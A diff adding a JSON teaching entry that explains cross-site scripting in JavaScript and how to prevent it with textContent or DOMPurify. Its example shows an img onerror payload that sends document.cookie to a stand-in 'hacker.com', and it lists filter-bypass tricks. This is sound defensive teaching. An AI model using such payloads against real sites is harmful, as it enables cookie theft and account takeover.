@@ -1,0 +1,67 @@
+{
+  "version": "1.1",
+  "intent": "js.xss_intro",
+  "topic": "XSS (Cross-Site Scripting)",
+  "dimensions": {
+    "syntax": false,
+    "semantics": true,
+    "runtime": true
+  },
+  "relationships": {
+    "depends_on": [
+      "js.browser_security_model",
+      "js.modifying_elements"
+    ],
+    "related_to": [
+      "js.storage_security",
+      "js.csrf_intro"
+    ],
+    "often_confused_with": [
+      "js.csrf_intro"
+    ]
+  },
+  "question_map": {
+    "what": [
+      "what is xss",
+      "what is cross site scripting"
+    ],
+    "why": [
+      "why is innerhtml dangerous"
+    ],
+    "how": [
+      "how to prevent xss in javascript",
+      "how to sanitize html input"
+    ],
+    "compare": [
+      "xss vs csrf",
+      "innerhtml vs textcontent"
+    ],
+    "output": [
+      "malicious script executes in user browser"
+    ]
+  },
+  "1_beginner_explanation": {
+    "summary": "XSS (Cross-Site Scripting) is a terrifying attack where a hacker manages to sneak their own malicious JavaScript code onto YOUR website. If you allow users to leave a comment, and the hacker writes `<script>stealPasswords()</script>`, and your website blindly prints that comment to the screen, the browser will run the hacker's code on every other user's computer.",
+    "analogy": "Imagine you own a bulletin board. You let people pin sticky notes on it. A hacker pins a note that says: 'Guard, please give this person all the money in the vault.' If the Guard (the Browser) blindly obeys whatever is written on the board, you have been hacked. XSS is tricking the Guard by writing fake instructions."
+  },
+  "2_internal_mechanism": {
+    "execution_flow": "When the HTML parser is building the DOM, it doesn't care who wrote the text. If it encounters a `<script>` tag or an `onload=` attribute, it executes it in the current Origin. Because it runs in your Origin, the hacker's script has full access to `document.cookie` and `localStorage`.",
+    "memory": "XSS is primarily caused by developers using the dangerous `innerHTML` property to render user-submitted text directly into the DOM."
+  },
+  "3_real_world_example": {
+    "use_case": "A user's profile name rendering on a dashboard.",
+    "code": "// A hacker creates an account with the name:\n// \"<img src='x' onerror='fetch(\"http://hacker.com/?c=\" + document.cookie)'>\"\n\n//  VULNERABLE: If you render their name using innerHTML, the browser tries to load \n// the image 'x', fails, triggers 'onerror', and sends all your cookies to the hacker!\nprofileDiv.innerHTML = `Welcome, ${user.name}!`;\n\n//  SECURE: textContent strictly treats it as raw text. It will never run as code.\n// The user will literally just see the raw <img...> text on their screen.\nprofileDiv.textContent = `Welcome, ${user.name}!`;"
+  },
+  "4_common_confusion": {
+    "trap": "Thinking you can just 'filter out' the `<script>` tag. Hackers are incredibly clever. They can bypass your filter by using capital letters `<ScRiPt>`, or hiding code inside image tags (`<img onerror=\"badCode\">`), or inside SVG files, or even inside CSS `url(javascript:...)`.",
+    "fix": "Never write your own XSS filter. Always use `textContent`, or use a proven sanitization library like `DOMPurify` if you MUST use HTML."
+  },
+  "5_related_topics": [
+    "js.modifying_elements",
+    "js.storage_security"
+  ],
+  "6_edge_case": {
+    "quirk": "Modern React and Vue.js automatically prevent 99% of XSS by default because their templating engines (`{user.name}`) act like `textContent` under the hood. You actually have to go out of your way to write `dangerouslySetInnerHTML` in React to create an XSS vulnerability.",
+    "code": ""
+  }
+}
